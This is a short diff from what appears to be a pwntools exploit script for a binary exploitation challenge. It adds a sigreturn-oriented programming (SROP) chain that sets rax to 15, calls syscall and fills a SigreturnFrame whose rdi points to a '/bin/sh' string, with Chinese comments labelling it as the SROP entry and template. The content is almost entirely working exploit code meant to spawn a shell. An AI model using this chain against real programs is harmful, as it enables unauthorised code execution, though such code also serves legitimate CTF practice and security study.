@@ -112,6 +112,12 @@ if "pow" in sys.argv:
 
 
 # SROP
+## 进入srop
+payload += p64(pop_rax) + p64(0xf)
+payload += p64(syscall)
+
+
+## srop模版
 frame = SigreturnFrame()
 frame.rdi = 0x4048f4  # /bin/sh
 frame.rsi = 0
